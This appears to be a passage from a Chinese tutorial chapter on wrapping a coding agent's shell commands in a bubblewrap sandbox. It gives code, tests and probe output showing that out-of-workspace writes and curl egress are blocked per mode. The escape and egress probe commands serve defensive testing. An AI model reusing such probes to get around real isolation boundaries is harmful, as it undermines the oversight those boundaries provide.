# 第 20 章 · 沙箱：把"允许"从一个判断变成一条边界

> **代码**：`steps/step20_sandbox/`
> **分支**：`feat/linux-sandbox`
> **产出**：`src/minicodex/sandbox.py`（从沙箱模式生成 bubblewrap 命令行）、`src/minicodex/tenancy.py`（`Owner`，"这是谁的数据"那条缝）、`shell.py` 一个分支、`policy.py` 第二张表、`probe_sandbox.py` 六段、`probe_mutations_ch20.py` 26 条
> **前置**：做完第 19 章。本章 50 个测试，其中 4 个需要真的 `bwrap`（没有就跳过，并说明缺的是什么），其余在任何平台离线跑。`probe_sandbox.py` **只在 Linux 上有意义**。第一版的数字来自 WSL2 Ubuntu；这次改写在一台真正的 Linux 机器上（内核 6.18，bubblewrap 0.9.0）把每一段都重新量了一遍
> **阅读顺序在第 15 章之前，编号在其之后。** 理由和第 16–19 章一样。

---

## §0 开工前的准备

### 0.1 本章会遇到的新概念

- **沙箱（sandbox）**：一个"围起来的环境"，里面跑的程序只能碰到你允许的东西。第 5 章的"审批"是**判断**一条命令危不危险；沙箱是**让它做不到**，不管它是什么命令。
- **内核（kernel）**：操作系统最核心的那部分，所有程序读文件、联网、启动进程，最后都要经过它。由内核强制执行的限制，程序自己绕不过去。
- **挂载（mount）**：把一个目录"放到"文件系统的某个位置上。Linux 上你看到的整棵目录树，就是一堆挂载拼起来的。
- **绑定挂载（bind mount）**：把一个已有的目录**再挂一次**到另一个位置（或同一个位置）。可以挂成**只读**：内容一样，但谁都写不进去——包括 root。
- **命名空间（namespace）**：Linux 让一组进程"看到"一个和别人不同的世界的机制。**挂载命名空间**：自己的一棵目录树；**网络命名空间**：自己的网络（新建的里面什么都连不上）；**PID 命名空间**：自己的进程编号（第一个进程是 1 号）。
- **bubblewrap（`bwrap`）**：一个小命令行工具，用上面这些命名空间搭一个沙箱，然后在里面运行你给的命令。**它的命令行参数就是沙箱的规则**：`--ro-bind / /` 是"把整棵树只读地挂进来"，`--bind <目录> <目录>` 是"这一个目录可写"，`--unshare-net` 是"没有网络"。
- **landlock / seccomp**：Linux 另外两种限制机制（限制能访问的文件 / 能用的系统调用）。codex 都用；这一章只用 bwrap，§2 讲为什么。
- **进程组（process group）**：一组相关的进程。第 2 章的超时就是"杀掉整个进程组"。
- **退出码（exit code）**：程序结束时交出的一个数字，0 表示成功，别的表示各种失败。这一章会遇到一个坑：沙箱自己没搭起来，和命令跑了但失败，退出码一样。
- **多租户（multi-tenant）/ 所有者（owner）**：一个服务器给好几个人用，每个人的数据要分开。这一章只做"给'这是谁的'一个类型"，真正的多用户是第 23 章。
- **大小写不敏感的文件系统**：Windows 和 macOS 默认把 `alice` 和 `Alice` 当成**同一个**目录名，Linux 不会。§9.3 会用到。

### 0.2 本章会遇到的新 Python 写法

| 写法 | 意思 |
|---|---|
| `shutil.which("bwrap")` | 在 `PATH` 里找这个程序，找到返回完整路径，找不到返回 `None` |
| `@staticmethod` | 类里的一个普通函数，不需要 `self`。`SandboxSpec.for_mode(...)` 直接用类名调用 |
| `Path(...).as_posix()` | 路径用 `/` 分隔的字符串形式（Windows 上 `str(path)` 会用 `\`） |
| `asyncio.create_subprocess_exec(*argv)` | 启动一个程序，参数是一个列表。和第 2 章的 `create_subprocess_shell(command)` 不同：后者把整行交给 shell 解释 |
| `re.compile(r"\A[a-z0-9]...\Z")` | `\A`、`\Z`：整个字符串的开头和结尾。`{0,63}`：重复 0 到 63 次 |
| `def __post_init__(self)` | dataclass 造完对象后自动调用的检查函数 |
| `class OwnerError(ValueError)` | 自定义异常类，继承 `ValueError` |
| `pytest.mark.skipif(cond, reason=...)` | 条件成立就跳过这个测试，并打印原因 |
| `@pytest.mark.parametrize("key", [...])` | 同一个测试用列表里的每个值各跑一次 |
| `monkeypatch.setattr("minicodex.sandbox.shutil.which", fake)` | 在这个测试里，把 `minicodex.sandbox` 模块看到的 `shutil.which` 换成假的 |
| `subprocess.run(argv, capture_output=True, text=True, timeout=30)` | 同步地运行一个程序，等它结束，拿回输出 |

### 0.3 开分支，装 bubblewrap

```bash
git switch main
git pull
git switch -c feat/linux-sandbox

# 只在 Linux 上（Ubuntu / Debian）：
sudo apt install bubblewrap
bwrap --version                      # bubblewrap 0.9.0
```

没有 bubblewrap、或者不在 Linux 上，这一章的代码照样能写、大部分测试照样能跑——§10 讲这是怎么做到的。

### 0.4 先说清楚一件事：这一章的沙箱没有接上

照着这一章做完，你运行 `minicodex ask` 或者打开第 19 章的控制台，**命令不会在沙箱里跑。**

这一章做出来的是一个**机制**：`sandbox.py` 能生成一条正确的 bubblewrap 命令行，`ShellSession(sandbox=...)` 收到一个沙箱就会用它，`judge_command(confined=True)` 知道被关起来的会话可以少问几次。三样都有测试，测试都通过。但是程序里**没有任何一处**真的造一个沙箱交给 `ShellSession`，也没有任何一处传 `confined=True`：

```
$ grep -rn "sandbox=\|confined=\|for_mode(" src/minicodex --include=*.py | grep -v "src/minicodex/sandbox.py"
$                                    # 一行都没有
```

第一版的这一章没有说清楚这一点（它的 PR 描述写着"`run_shell` 现在可以在 bubblewrap 里跑"）。第 21 章写到一半时注意到了，原话是"沙箱机制存在、测试完整，但没有从 CLI 的 `--sandbox-mode` 接一根真正的管线过来……是第 20 章自己就没做的那部分"。`minicodex-live` 最后把它接上了（它的 `__main__._ask` 里有一段造沙箱、检查 `unavailable()`、设置 `context.shell.sandbox` 的代码）。

这一次改写**没有**在第 20 章里把它接上——第 21 章的那段话讲的就是这件事，这里补上它会让那一段失去依据。所以读这一章时请记住：**下面所有关于"命令被挡住了"的测量，都是直接调用 `sandbox.wrap()` 量出来的，不是通过 `minicodex` 量的。** §10.3 会回到这件事。

### 0.5 这次改写时找到的

这次改写有一个第一版没有的条件：**机器上有真的 bubblewrap**。第一版写在 Windows 上，四个需要 `bwrap` 的测试在那里全部跳过，数字是在 WSL 里量的。这一次每个测试都真的跑，每段测量都真的量。找到了这些：

1. **`full-access` 关掉网络后，哪儿都写不了**——连自己的工作区都写不了，比 `workspace-write` 还严（§4.2）。
2. **F20-07 的说法正好说反了**：第一版说"shell 要读到记忆目录，必须单独告诉内核"；实测在 `--ro-bind / /` 下，shell 本来就能读所有东西，`read_roots` 唯一的作用是让工作区里的某个目录**不能写**（§7）。
3. **一个只在没有 bwrap 的机器上才有意义的测试**：`for_mode` 不许悄悄退回"没有沙箱"——这个测试在装了 bwrap 的机器上永远通过，哪怕代码真的退回了（§10.2）。
4. **测量网络的探针没有对照组**：在一台根本连不上 `example.com` 的机器上，它把"连不上"全部算成"被沙箱挡住了"，连打开了网络的那两行也是；解释文字还是写死的（"curl 6"，实测是 7）（§4.3）。
5. **一个没有调用者的方法**：`chdir_is_reachable` 的说明写着"在运行之前检查"，可没有任何代码调用它；它的测试名字也这么说（§5.1）。
6. 两处注释错误：`tenancy.py` 说认证是"第 22 章"（是第 23 章），说"四样全局的东西"（这一章是三样）。

---

## §1 这一章要做出来的东西

### 1.1 先看见它动

第 5 章的故障清单里有这么一条，F05-04：

> `python -c "open('x','w')"` writes in read-only mode.
> **Tokenising is *perfect* here and tells you nothing** — the danger is
> inside a string argument.

它不是猜的，是量出来的。`read-only` 模式下，这条命令照写不误。分词器把
`python` 认成 `INTERPRETER` 认得完全正确——然后什么也没发生，因为**判断层**
从来就没有能力阻止任何事。

还有 F05-05：

> `curl` exfiltrates; `pip install` pulls a malicious package.
> Classified NETWORK, **recognised rather than blocked** — a real network
> policy needs the OS sandbox this chapter does not build.

"recognised rather than blocked"。识别了，没有阻止。

这一章就是那个 "the OS sandbox this chapter does not build"。跑一下：


```
$ PROBE_URL=https://pypi.org/simple/ uv run python probe_sandbox.py escape

F05-04 -- an interpreter writing in read-only mode
  chapter 5's note: 'Tokenising is perfect here and tells you nothing'

  no sandbox        exit=0  file exists: True
  read-only         exit=1  file exists: False
                    OSError: [Errno 30] Read-only file system: '/tmp/tmpwa0d0ukc/outside.txt
  workspace-write   exit=0  wrote inside: True
  workspace-write   exit=1  wrote outside: False

F05-05 -- network, 'recognised rather than blocked'  (https://pypi.org/simple/)
  no sandbox        reached   <- the control
  read-only         not reached (curl exit 6)
  read-only +net    reached
```

（这次在一台 Linux 机器上真的量的。`PROBE_URL` 是改写时加的，§4.3 讲为什么。）

第一行是第 5 章的状态：写成功了。第二行开始，同一条命令，同一个模型分类，
结果变成 `OSError: [Errno 30] Read-only file system`。

注意第三、四行：`workspace-write` 下**工作区里写得进去，工作区外写不进去**。
这正是第 5 章说自己做不到的那件事——判断一条 shell 命令的字节会落在哪里。

### 1.2 这一章真正的论点

**"允许"是一个判断，不是一条边界。**

第 5 章造了判断层，写得很好：分词、按最危险的段落定级、按模式和策略决定放行
还是询问。它唯一没有的能力是**阻止**。`policy.py` 自己在
`_SHELL_ALLOWED_BY_MODE` 上面写着：

```python
# The thing that enforces "inside the workspace" is an OS sandbox: seatbelt on
# macOS, landlock on Linux, a job object on Windows.  This chapter does not
# build one.
```

这一章造执行层。而一旦执行层存在，会发现判断层在**没人设计过的地方**悄悄承重：

1. 三个模式（`read-only` / `workspace-write` / `full-access`）一直只是**名字**，
   现在必须变成真实的 bind 集合和网络开关。
2. `cd` 可以走出工作区——第 13 章早就记录了这件事，在没有强制的年代它无害。
3. 第 16 章给 `read_file` 加的那个只读 extra root 是 **Python 层**的；
   shell 要能读到它，必须**单独**告诉内核。
4. 然后：执行层第一次让"这是谁的工作区"这个问题**可以被问出来**——
   而答案暴露了记忆目录**没有主人**。

一句话：**执行把名字变成机制，而机制需要主人。**


### 1.3 这一章的代码在哪儿

- **`sandbox.py`**（新）：从"沙箱模式 + 工作区"算出一条 bubblewrap 命令行。§3–§7。
- **`shell.py`**（改一个分支）：`ShellSession` 收到一个沙箱，就把命令包一层再运行。§5、§10。
- **`policy.py`**（加一张表）：被关起来的会话，审批可以少问几次。§8。
- **`tenancy.py`**（新）：`Owner`——"这些数据是谁的"。§9。
- 测试 `tests/test_faults_ch20.py`、测量 `probe_sandbox.py`、变异 `probe_mutations_ch20.py`。

（再说一遍 §0.4：这些都写好、测好了，但这一章没有把沙箱接到 `minicodex ask` 或控制台上。）

---

## §2 为什么是 bubblewrap，不是 landlock

先说清楚 codex 做了什么。它的沙箱有四个后端
（`codex-rs/sandboxing/src/manager.rs:35-40`）：

```rust
pub enum SandboxType {
    None,
    MacosSeatbelt,
    LinuxSeccomp,
    WindowsRestrictedToken,
}
```

Linux 那条路径里有三样东西：landlock ABI V5
（`linux-sandbox/src/landlock.rs:140`，`let abi = ABI::V5;`）、seccomp
（按 `AF_*` 族拦 `socket` 系统调用）、以及 **bubblewrap**——而且是
**自带一份二进制**，运行时释放出来（`linux-sandbox/src/bundled_bwrap.rs`）。

所以选 bwrap 不是找了个便宜替代品，**它本来就是 codex 的真实选项之一**。

不选 landlock 的理由是教学上的：Python 里调 landlock 要 `ctypes` 打裸系统调用号，
seccomp 要手工拼 BPF 程序。那会变成一章讲 ABI 的内容，教不出隔离本身。
而 bwrap 是一个子进程，**它的参数就是策略**——可读、可测、可以在正文里逐个参数讲。

代价要说明白：landlock 是内核里的 LSM，bwrap 是 mount/pid/net 命名空间。
后者更粗，也更容易理解。**这是一次简化，不是一次复现。**

---

## §3 F20-01：bind 集合是量出来的，不是想出来的

第一版我写的是"只绑工作区"——听起来更严格。测了一下：


```
$ uv run python probe_sandbox.py binds

  the smallest bind set that still has a shell in it

  exit=1   --ro-bind <ws> <ws>                                        bwrap: execvp /bin/sh: No such fil
  exit=1   --ro-bind <ws> <ws> --ro-bind /bin /bin                    bwrap: execvp /bin/sh: No such fil
  exit=0   --ro-bind <ws> <ws> --ro-bind /bin /bin --ro-bind /lib /li ok
  exit=0   --ro-bind / /                                              ok
```


"只绑工作区"不是更严格的沙箱，**是一个坏掉的沙箱**：`/bin/sh` 都不在里面，
什么都跑不起来。加上 `/bin` 还不够，因为 `sh` 要动态链接；要到
`/bin` + `/lib` + `/lib64` 才有一个能用的 shell。

于是形状定下来了：**把 `/` 绑成只读，然后在上面打可写的洞。**


```python
# Everything readable, nothing writable -- then holes.  See `_ROOT`
# above for why this is a measurement rather than a preference.
argv += ["--ro-bind", _ROOT, _ROOT]

# `as_posix()`, for `_ROOT`'s reason: these are paths inside a Linux
# namespace, whatever host is building the command line.
for path in self.spec.writable():
    argv += ["--bind", path.as_posix(), path.as_posix()]
```


这个形状还有一个附带的好处，值得单独说：**它的失败方向是安全的**。
忘了加一个可写路径，结果是一次写入被拒绝；而在"从空集合往上加"的设计里，
忘了加一个可读路径，结果是**所有东西都跑不了，包括 `sh`**。
一个让你立刻发现，一个让你在半夜排查。

### 3.1 一个只在 Windows 上暴露的 bug

这段代码第一版是这么写的：

```python
_ROOT = Path("/")
...
argv += ["--ro-bind", str(_ROOT), str(_ROOT)]
```

测试直接红了，而且是在**这本书写作的那台 Windows 机器上**红的：

```
E   AssertionError: assert ('/', '/') in [('\\', '\\')]
```

`str(Path("/"))` 在 Windows 上是 `"\\"`。也就是说，这台机器生成出来的 bwrap
命令行，绑的是一个 bwrap 从没听说过的目录。

这个 bug 有意思的地方在于**它只可能被离线测试抓住**。真正跑 bwrap 的测试在
Windows 上是跳过的；如果这个模块只用"真跑一次看看"来验证，这行代码会一路活到
有人在 Windows 上生成命令行、再拿到 Linux 上执行的那一天。

修法是让类型说实话：


于是 `_ROOT` 成了一个普通字符串。它上面的注释把 §3 的测量和这个坑都记下来了：

```python
# Measured, not chosen.  `probe_sandbox.py binds` walks up from the smallest
# bind set that could plausibly work:
#
#     --ro-bind <ws> <ws>                          exit=1  execvp /bin/sh: No such file
#     --ro-bind <ws> <ws> --ro-bind /bin /bin      exit=1  execvp /bin/sh: No such file
#     --ro-bind <ws> <ws> --ro-bind /bin /bin
#                         --ro-bind /lib /lib
#                         --ro-bind /lib64 /lib64  exit=0  ok
#     --ro-bind / /                                exit=0  ok
#
# So "bind only the workspace" is not a sandbox, it is a broken one: the
# interpreter has to be reachable or nothing runs at all.  Binding `/`
# read-only and then punching writable holes in it is the shape that works,
# and it is also what makes the failure mode safe -- forgetting to add a
# writable path denies a write, where forgetting to add a readable path in the
# other design denies *everything*, including `sh`.
#
# A plain string, and `Path("/")` was tried first.  It is wrong for a reason
# that only shows up off Linux: `str(Path("/"))` is `"\\"` on Windows, so the
# argv this module builds while running on the machine this book was written
# on named a directory bwrap has never heard of.  The test asserting on the
# bind set is what caught it.  The root of a bwrap namespace is a *Linux path
# literal*, not a path on whatever host happens to be constructing the command
# line, and the type has to say so.
_ROOT = "/"
```

### 3.2 代码：`sandbox.py` 的开头

新建 `src/minicodex/sandbox.py`。模块说明把这一章要回答的问题又写了一遍——第 5 章自己承认做不到的两件事：

```python
"""Making "allowed" mean something: the OS boundary under `run_shell`.

For nineteen chapters `policy.judge_command` has been the sandbox.  It reads a
command, decides how risky it looks, and either runs it or asks a human.  What
it has never done is *stop* anything: once the verdict is `ALLOW`, `shell.run`
hands the string to a subprocess with the whole filesystem and the whole
network behind it.

Chapter 5 knew, and wrote both halves of it down:

* **F05-04** -- `python -c "open('x','w')"` writes in `read-only` mode.  The
  fault list's own words: *"Tokenising is perfect here and tells you nothing --
  the danger is inside a string argument."*
* **F05-05** -- `curl` exfiltrates.  Classified `NETWORK`, and *"recognised
  rather than blocked ... a real network policy needs the OS sandbox this
  chapter does not build."*

`policy.py` says the same thing in a comment above `_SHELL_ALLOWED_BY_MODE`:
the thing that enforces "inside the workspace" is an OS sandbox, and *"this
chapter does not build one"*.  This module is that sandbox, twenty chapters
later, on Linux only.

Two consequences worth stating before the code, because they are the reason
the chapter exists rather than side effects of it:

**Enforcement lets the judgement layer relax.**  `_SHELL_ALLOWED_BY_MODE`
grants `workspace-write` exactly `{Risk.READ}` today -- writing always asks,
even in the mode named for writing, because *where* the bytes land was
unknowable.  Under a sandbox it is knowable, so `workspace-write` can finally
mean what it says.  That is not just safety: F05-06 measured approval fatigue
at 2-4 prompts per task, and the prompts this removes are the ones a user was
answering without reading.

**Enforcement makes ownership answerable.**  A bind set has to name a
directory, which forces the question of whose directory it is -- see
`Owner` in `tenancy.py`.

Why bubblewrap and not landlock directly: codex ships both, and bundles bwrap
itself (`codex-rs/bwrap/`, `codex-rs/linux-sandbox/src/bundled_bwrap.rs`).
Calling landlock from Python means `ctypes` against raw syscall numbers and
hand-assembled seccomp BPF; that is a chapter about an ABI, not about
isolation.  bwrap is a subprocess whose *arguments are the policy*, which is
readable, testable, and printable in a tutorial.
"""

from __future__ import annotations

import shutil
from dataclasses import dataclass, field
from pathlib import Path
from typing import Protocol

from minicodex.policy import SandboxMode
```

> 导入只有标准库的 `shutil`、`dataclasses`、`pathlib`、`typing`，和第 5 章的 `SandboxMode`（`"read-only" | "workspace-write" | "full-access"`）。

要调用的程序的名字：

```python
# The wrapper binary.  Looked up once by name rather than hard-coded to
# `/usr/bin/bwrap`: distributions disagree (Debian and Ubuntu use /usr/bin,
# Nix and Flatpak runtimes do not), and a wrong absolute path fails as "no
# such file" at the first command instead of as "not installed" at startup.
#
# codex resolves this the same way and then goes further, falling back to a
# copy it bundles when the system has none (`bundled_bwrap.rs`).  Bundling a
# binary is a packaging problem, not a teaching one, so this stops at the
# lookup and says so when it fails (F20-02).
BWRAP = "bwrap"
```

> 只写名字 `"bwrap"`，不写死 `/usr/bin/bwrap`：不同的 Linux 发行版装在不同地方，交给 `shutil.which` 去 `PATH` 里找。

---

## §4 F20-04：网络必须是独立的开关

这条是直接照抄 codex 的，而且值得说清楚为什么。

codex 把两件事分在两个类型里（`codex-rs/protocol/src/permissions.rs:78-118`）：

```rust
pub enum NetworkSandboxPolicy {
    #[default]
    Restricted,
    Enabled,
}

pub enum FileSystemAccessMode {
    Read,
    Write,
    Deny,
}
```

一个是网络的二值开关，一个是**逐路径**的文件系统访问模式。它们是分开的。

诱惑是把网络折进模式枚举里——`read-only` 顺便断网，`full-access` 顺便通网。
但那样四种组合里有两种就**够不着了**，而这两种都是真实需求：

| | 断网 | 通网 |
|---|---|---|
| `read-only` | CI 里读代码 | 读代码 + 查文档 |
| `workspace-write` | 改代码，不许出网 | 改代码 + 装依赖 |

"改代码但不许出网"是任何碰包管理器的任务的合理默认。所以：

```python
if not self.spec.network:
    argv.append("--unshare-net")
```

只有一个地方让网络跟随模式，就是 `full-access`——因为那个模式的名字就是
"没有边界"，给它断网等于让常量说谎。

实测四种组合都成立：


```
$ PROBE_URL=https://pypi.org/simple/ uv run python probe_sandbox.py net

  four combinations, because all four are real configurations
  target: https://pypi.org/simple/  (PROBE_URL to change it)

  no sandbox                      reached   <- the control
  read-only        network=False  not reached (curl exit 6)
  read-only        network=True   reached
  workspace-write  network=False  not reached (curl exit 6)
  workspace-write  network=True   reached
```

（第一行是改写时加的对照组，§4.3。）


> **和 codex 的差距**：codex 的网络控制远不止开关。`network-proxy`（15,000 行）
> 是一个 MITM 代理：自签 CA、按域名授权、SOCKS5，还有一个**凭据代理**——
> GitHub 和 OpenAI 的真实密钥由代理注入，**沙箱里的进程从头到尾看不到它们**
> （`network-proxy/src/credential_broker/providers/`）。
> 这里只有 `--unshare-net`。那是一个开关，不是一个策略。


### 4.1 代码：`SandboxSpec`——一个会话能碰到什么

```python
@dataclass(frozen=True)
class SandboxSpec:
    """What one conversation's commands are allowed to reach.

    `network` is deliberately its own field rather than being derived from
    `mode` at the point of use.  codex separates them at the type level --
    `NetworkSandboxPolicy` is `Restricted | Enabled` and lives beside a
    per-path `FileSystemAccessMode { Read, Write, Deny }`
    (`codex-rs/protocol/src/permissions.rs:78-118`) -- and the reason is that
    the four combinations are all real.  "Read the repo, reach the internet"
    is a research task; "write the repo, no internet" is the default for
    anything touching a package manager.  Folding network into a filesystem
    enum makes two of the four unreachable, which is the same argument
    `policy.py` already makes for keeping `SandboxMode` and `ApprovalPolicy`
    apart.

    `read_roots` carries chapter 16's extra read-only root, and what it does
    is narrower than it looks.  The namespace starts from `--ro-bind / /`, so
    the shell can already *read* every file the host user can -- with or
    without this field.  What a read root adds is protection from *writing*
    when it lies inside a writable hole: a memory directory inside the
    workspace stays read-only.  So the two boundaries are not mirror images.
    `paths.resolve(..., extra_roots=...)` bounds what `read_file` may read, in
    Python; the sandbox bounds what `run_shell` may *write* and whether it may
    reach the network, in the kernel, and does not bound reading at all
    (F20-07).  The first version of this paragraph said a path missing from
    the sandbox would be unreadable by the shell; measured under bwrap, it is
    readable either way.  Found when chapter 20 was rewritten.
    """

    mode: SandboxMode
    root: Path
    read_roots: tuple[Path, ...] = field(default_factory=tuple)
    network: bool = False

    @staticmethod
    def for_mode(
        mode: SandboxMode,
        root: Path,
        *,
        read_roots: tuple[Path, ...] = (),
    ) -> SandboxSpec:
        """The default spec for a mode.

        Network follows the mode here, and this is the *only* place it does.
        `full-access` is the mode that means "no boundary", so denying it the
        network would make the name a lie; everything else starts closed and a
        caller who wants otherwise passes `network=True` explicitly.
        """
        return SandboxSpec(
            mode=mode,
            root=root.resolve(),
            read_roots=tuple(p.resolve() for p in read_roots),
            network=(mode == "full-access"),
        )

    def writable(self) -> tuple[Path, ...]:
        """Paths the payload may write to.

        `read-only` gets nothing, which is the whole point of the name.
        `full-access` gets the whole filesystem: with the network on it is not
        wrapped at all (see `BubblewrapSandbox.wrap`), and with the network off
        it is wrapped only to take the network away.

        That second case arrived when chapter 20 was rewritten.  This method
        used to return nothing for `full-access`, on the assumption that a
        `full-access` session is never wrapped -- but `for_mode(...,
        network=False)` wraps one, and then `--ro-bind / /` with no holes made
        "full access, no network" unable to write anywhere, not even its own
        workspace: stricter than `workspace-write`, under the name that means
        "no boundary".
        """
        if self.mode == "workspace-write":
            return (self.root,)
        if self.mode == "full-access":
            return (Path(_ROOT),)
        return ()
```

> - **四个字段**：模式、工作区根目录、额外的只读目录（§7）、网不网。`frozen=True`：造出来就不能改。`field(default_factory=tuple)`：默认一个空元组。
> - **说明文字**：为什么网络是**单独**一个字段（上面那张 2×2 的表）；`read_roots` 那一段是这次改写重写的（§7）。
> - **`for_mode`**（`@staticmethod`，用类名调用）：一个模式的默认配置。`root.resolve()` 把工作区变成绝对路径。**只有 `full-access` 默认有网**。
> - **`writable()`**：哪些路径可写。`read-only` 什么都没有；`workspace-write` 是工作区；`full-access` 是整个 `/`——最后这一条是这次改写加的，见下一节。

网络开关的三个测试：

```python
def test_F20_04_network_is_off_by_default_in_every_confined_mode(tmp_path: Path) -> None:
    for mode in ("read-only", "workspace-write"):
        assert "--unshare-net" in _wrap(mode, tmp_path)


def test_F20_04_the_four_combinations_are_all_reachable(tmp_path: Path) -> None:
    """codex keeps these apart at the type level -- `NetworkSandboxPolicy` is
    its own enum beside a per-path `FileSystemAccessMode`
    (`codex-rs/protocol/src/permissions.rs:78-118`). Folding network into the
    filesystem mode would make two of these four unreachable, and both of the
    unreachable ones are real configurations: read the repo while fetching
    docs, write the repo with no egress.
    """
    seen = set()
    for mode in ("read-only", "workspace-write"):
        for network in (False, True):
            spec = SandboxSpec(mode=mode, root=tmp_path, network=network)  # type: ignore[arg-type]
            argv = BubblewrapSandbox(spec).wrap("echo hi", cwd=str(tmp_path))
            assert argv is not None
            seen.add((mode, "--unshare-net" not in argv))
    assert len(seen) == 4


def test_F20_04_full_access_keeps_its_name(tmp_path: Path) -> None:
    """The one place network follows the mode: a `full-access` session with
    the network taken away would be a lie told by a constant."""
    assert SandboxSpec.for_mode("full-access", tmp_path).network is True
    assert SandboxSpec.for_mode("read-only", tmp_path).network is False
```

### 4.2 改写时发现：`full-access` 一关网，哪儿都写不了

上面那张表说"四种组合都是真实需求"，`SandboxSpec` 的说明也这么说。可还有第五种：**`full-access`，但不要网络**。`for_mode("full-access", root, network=False)` 能造出来，说明它是被设想过的——"随便改，但别往外发东西"。

第一版的 `writable()` 是这样的：

```python
        if self.mode == "workspace-write":
            return (self.root,)
        return ()
```

说明文字写着"`full-access` 在这里什么都没有，因为它根本不会被包装"。可 `wrap()` 里不包装的条件是 `full-access` **并且有网**（§6.1 的代码）。没有网的 `full-access` 会被包装：`--ro-bind / /`，然后——一个可写的洞都没有。

对着真的 bwrap 试一下：在工作区里写一个文件，在工作区外面写一个文件：

```
$ uv run python fa20.py            # 第一版的代码
workspace-write  network=False wrapped=True   inside-ok | /bin/sh: 1: cannot create /tmp/tmpjdpmmd4o/out.txt: Read-only file system
full-access      network=True  wrapped=False  inside-ok | outside-ok
full-access      network=False wrapped=True   /bin/sh: 1: cannot create /tmp/tmp_3z0zq4z/in.txt: Read-only file system | /bin/sh: 1: cannot create /tmp/tmpjdpmmd4o/out.txt: Read-only file system
```

**名字叫"完全访问"的那个模式，关掉网络以后，连自己的工作区都写不进去**——比 `workspace-write` 还严。没有任何测试碰到它：所有测试里的 `full-access` 都是默认有网的那个，都不会被包装。

修法：`writable()` 对 `full-access` 返回整个 `/`（上面 §4.1 的代码），`wrap()` 里在 `--ro-bind / /` 后面再 `--bind / /`——后绑的那个说了算。修完：

```
$ uv run python fa20.py            # 修好之后
workspace-write  network=False wrapped=True   inside-ok | /bin/sh: 1: cannot create /tmp/tmpfq0svfi6/out.txt: Read-only file system
full-access      network=True  wrapped=False  inside-ok | outside-ok
full-access      network=False wrapped=True   inside-ok | outside-ok
```

（`fa20.py` 对三种配置各跑一次"里面写一个、外面写一个"；临时目录名每次不同。）

两个测试：一个看命令行（任何平台都能跑），一个对着真的内核写一次（要 bwrap）：

```python
def test_full_access_without_the_network_can_still_write_everywhere(tmp_path: Path) -> None:
    """`full-access` minus the network is the one wrapped `full-access`, and
    `writable()` used to give it nothing -- so it could not write anywhere,
    not even its own workspace, under the name that means "no boundary"."""
    spec = SandboxSpec(mode="full-access", root=tmp_path, network=False)
    argv = BubblewrapSandbox(spec).wrap("echo hi", cwd=str(tmp_path))
    assert argv is not None
    assert "--unshare-net" in argv
    assert ("/", "/") in _pairs(argv, "--bind")
    # The writable bind comes after the read-only one, so it is the one that wins.
    assert argv.index("--bind") > argv.index("--ro-bind")


@needs_bwrap
def test_full_access_without_the_network_writes_against_a_kernel(tmp_path: Path) -> None:
    import subprocess

    target = tmp_path / "written.txt"
    spec = SandboxSpec(mode="full-access", root=tmp_path, network=False)
    argv = BubblewrapSandbox(spec).wrap(f"echo hi > {target}", cwd=str(tmp_path))
    assert argv is not None
    got = subprocess.run(argv, capture_output=True, text=True, timeout=30)
    assert got.returncode == 0, got.stderr
    assert target.read_text() == "hi\n"
```

### 4.3 改写时发现：测网络的探针没有对照组

第一版 `probe_sandbox.py net` 在写这本书的那台机器上（WSL）打出来的是"关网的两行连不上、开网的两行连上了"，这正是想看到的。这次在一台出网要经过代理、而代理不放行 `example.com` 的机器上跑：

```
$ uv run python probe_sandbox.py net            # 第一版的探针
  read-only        network=False  blocked (curl 7)
  read-only        network=True   blocked (curl 56)
  workspace-write  network=False  blocked (curl 7)
  workspace-write  network=True   blocked (curl 56)
```

**四行全是 blocked，连打开了网络的那两行也是。** 这台机器上，不进沙箱的 `curl https://example.com` 本来就连不上——可探针没有问过这件事，它把"这台机器连不上"全算在了沙箱头上。`escape` 那一段也一样，而且它的解释文字是写死的：`(curl 6 = could not resolve host)` 印在一个实测是 7 的退出码旁边。

这是这本书里"测量工具自己说谎"的又一次，形状和第 6、14、16、18 章的那几次一模一样：**它没有报错，它报了一个关于别的东西的数字。** 一个"被挡住了"的结论，只有在旁边有一个"不进沙箱就连得上"的对照时才有意义。

修法三件事：目标地址可以用 `PROBE_URL` 换；每一组都先跑一次不进沙箱的对照；结论从实测的退出码算出来，而不是写死：

```python
# F05-05: "`curl` exfiltrates". Same reasoning. `-m 5` so a probe run on a
# machine with no egress finishes rather than hanging for the default timeout.
#
# The URL is an environment variable, and every network row is printed beside
# an unsandboxed *control*.  Both arrived when chapter 20 was rewritten, on a
# machine whose egress goes through a proxy that refuses example.com: there the
# first version printed "blocked" for every combination, including the two
# with the network switched on, and blamed the sandbox for a host this machine
# cannot reach at all.  A row labelled "blocked" means something only next to
# a control that reached.  Its exit codes were hard-coded too -- "(curl 6 =
# could not resolve host)" printed beside a measured 7.
NETWORK_URL = os.environ.get("PROBE_URL", "https://example.com")
NETWORK_PAYLOAD = f"curl -s -m 5 {NETWORK_URL} -o /dev/null"


def _reach(returncode: int) -> str:
    return "reached" if returncode == 0 else f"not reached (curl exit {returncode})"
```

```python
def net(_args: argparse.Namespace) -> None:
    """F20-04: the network switch is independent of the filesystem one."""
    if not _require_linux("net"):
        return
    with tempfile.TemporaryDirectory() as tmp:
        ws = Path(tmp)
        print("  four combinations, because all four are real configurations")
        print(f"  target: {NETWORK_URL}  (PROBE_URL to change it)")
        print()
        control = _sh(NETWORK_PAYLOAD, cwd=str(ws))
        print(f"  {'no sandbox':<16} {'':<14} {_reach(control.returncode)}   <- the control")
        if control.returncode != 0:
            print("  the control did not reach either: the rows below say nothing")
            print("  about the sandbox. Set PROBE_URL to a host this machine can reach.")
        for mode in ("read-only", "workspace-write"):
            for network in (False, True):
                spec = SandboxSpec(mode=mode, root=ws.resolve(), network=network)
                argv = BubblewrapSandbox(spec).wrap(NETWORK_PAYLOAD, cwd=str(ws))
                assert argv is not None
                got = _run(argv)
                print(f"  {mode:<16} network={network!s:<6} {_reach(got.returncode)}")
```

对照组也连不上时，探针现在会直说"下面这几行和沙箱无关"：

```
$ uv run python probe_sandbox.py net            # 修好之后，仍然对着 example.com
  four combinations, because all four are real configurations
  target: https://example.com  (PROBE_URL to change it)

  no sandbox                      not reached (curl exit 56)   <- the control
  the control did not reach either: the rows below say nothing
  about the sandbox. Set PROBE_URL to a host this machine can reach.
  read-only        network=False  not reached (curl exit 7)
  read-only        network=True   not reached (curl exit 56)
  workspace-write  network=False  not reached (curl exit 7)
  workspace-write  network=True   not reached (curl exit 56)
```

---

## §5 F20-05：bwrap 的失败和命令的失败，退出码一模一样

